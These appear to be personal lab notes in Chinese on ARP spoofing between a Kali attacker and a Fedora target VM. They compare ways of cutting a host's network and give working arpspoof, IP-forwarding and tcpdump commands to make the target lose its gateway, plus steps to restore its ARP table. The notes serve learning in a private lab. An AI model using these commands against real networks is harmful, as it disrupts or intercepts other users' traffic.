# 实验效果
- [x]  阻断靶机上网（阻断到外网的流量）
- [x]  阻断靶机与物理机通信(靶机ping不通网关)
- [ ]  阻断靶机与攻击机通信
- [ ]  完全断开靶机网络（使其无法通信）
- [ ]  中间人监听后选择性阻塞某些请求（如网页访问）

| 阻断类型       | 影响范围    | 是否可上网 | 是否可局域网通信 | 实现难度 | 隐蔽性 | 典型工具                    |
| ---------- | ------- | ----- | -------- | ---- | --- | ----------------------- |
| 完全断开靶机网络   | 所有通信中断  | ❌     | ❌        | ⭐⭐⭐  | 低   | Yersinia, DHCPig        |
| 阻断靶机上网     | 仅外网中断   | ❌     | ✅        | ⭐⭐   | 中   | `arpspoof`, `dsniff`    |
| 阻断靶机与物理机通信 | 仅与物理机不通 | ✅     | ❌（对物理机）  | ⭐⭐   | 中   | `arpspoof`              |
| 阻断靶机与攻击机通信 | 仅与攻击机不通 | ✅     | ✅（其他）    | ⭐    | 高   | `iptables`, ARP 静默      |
| 选择性阻塞（如网页） | 特定服务被封  | ✅（部分） | ✅        | ⭐⭐⭐⭐ | 高   | `ettercap`, `mitmproxy` |
# 达到靶机ping不通网关
## 实验环境
攻击机 kali 192.168.94.155
靶机 fedora 192.168.94.147

kali 执行的命令
```shell
# 1. 查看自身网络配置
ip a

# 2. 关闭 IP 转发（实现阻塞）
echo [0]{0:靶机只是ping不通网关; 1:靶机不能访问外网} | sudo tee /proc/sys/net/ipv4/ip_forward
## 推荐写法
sudo sysctl net.ipv4.ip_forward=0

# 3. 开始 ARP 欺骗攻击
sudo arpspoof -i [eth0]{指定网卡} -t [192.168.94.147]{目标主机} [192.168.94.1]{伪装对象,将自己伪装成网关}

# 4. 另开终端：开始抓包
sudo tcpdump -i eth0 -w /tmp/arp_attack.pcap icmp or arp

# 5. 攻击结束后终止进程（Ctrl+C）
# 6. 可选：恢复 IP 转发
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
### 靶机ARP恢复
[[ARP| arp命令]]
```shell
# 刷新arp表
sudo ip neigh flush dev <network card>

# 手动删除,攻击机的MAC地址
arp -d <攻击机的IP地址>
 
```

# 单词
card : 卡
spoof: 恶搞
